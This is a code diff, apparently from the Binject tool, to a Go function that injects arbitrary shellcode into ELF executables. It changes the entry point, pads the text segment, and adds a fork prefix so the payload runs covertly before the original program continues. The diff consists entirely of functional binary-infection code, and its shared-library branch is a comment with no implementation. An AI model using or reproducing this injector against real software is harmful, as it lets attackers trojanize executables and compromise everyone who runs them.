@@ -1,16 +1,18 @@
 package bj
 
 import (
+	"errors"
 	"io/ioutil"
 	"log"
 
 	"github.com/Binject/debug/elf"
+	"github.com/Binject/shellcode/api"
 )
 
 // ElfBinject - Inject shellcode into an ELF binary
 func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config *BinjectConfig) error {
 
-	shellcode, err := ioutil.ReadFile(shellcodeFile)
+	userShellCode, err := ioutil.ReadFile(shellcodeFile)
 	if err != nil {
 		return err
 	}
@@ -60,15 +62,14 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 		        5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
 					into the file - text segment p_offset + p_filesz (original)
 	*/
-	sclen := uint64(len(shellcode))
+
 	PAGE_SIZE := uint64(4096)
 	newOffset := uint64(0)
+	sclen := uint64(0)
+	shellcode := []byte{}
 
 	// 6. Increase p_shoff by PAGE_SIZE in the ELF header
 	elfFile.FileHeader.SHTOffset += int64(PAGE_SIZE)
-
-	// 7. Patch the insertion code (parasite) to jump to the entry point (original)
-	// originalEntry := elfFile.FileHeader.Entry
 
 	afterTextSegment := false
 	for _, p := range elfFile.Progs {
@@ -80,7 +81,35 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 		} else if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
 			// 1. Locate the text segment program header
 			// -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
-			elfFile.FileHeader.Entry = p.Vaddr + p.Filesz
+			originalEntry := elfFile.FileHeader.Entry
+
+			switch elfFile.FileHeader.Type {
+			case elf.ET_EXEC:
+				elfFile.FileHeader.Entry = p.Vaddr + p.Filesz
+			case elf.ET_DYN:
+				// The injected code needs to be executed before any init code in the
+				// binary. There are three possible cases:
+				// - The binary has no init code at all. In this case, we will add a
+				//   DT_INIT entry pointing to the injected code.
+				// - The binary has a DT_INIT entry. In this case, we will interpose:
+				//   we change DT_INIT to point to the injected code, and have the
+				//   injected code call the original DT_INIT entry point.
+				// - The binary has no DT_INIT entry, but has a DT_INIT_ARRAY. In this
+				//   case, we interpose as well, by replacing the first entry in the
+				//   array to point to the injected code, and have the injected code
+				//   call the original first entry.
+				// The binary may have .ctors instead of DT_INIT_ARRAY, for its init
+				// functions, but this falls into the second case above, since .ctors
+				// are actually run by DT_INIT code.
+				// from positron/elfhack
+			default:
+				return errors.New("Unknown Executable Type: " + string(elfFile.FileHeader.Type))
+			}
+
+			// 7. Patch the insertion code (parasite) to jump to the entry point (original)
+			shellcode = api.ApplyPrefixForkIntel64(userShellCode, uint32(originalEntry-elfFile.FileHeader.Entry-7), elfFile.ByteOrder)
+			sclen = uint64(len(shellcode))
+
 			// -Increase p_filesz to account for the new code (parasite)
 			p.Filesz += sclen
 			// -Increase p_memsz to account for the new code (parasite)
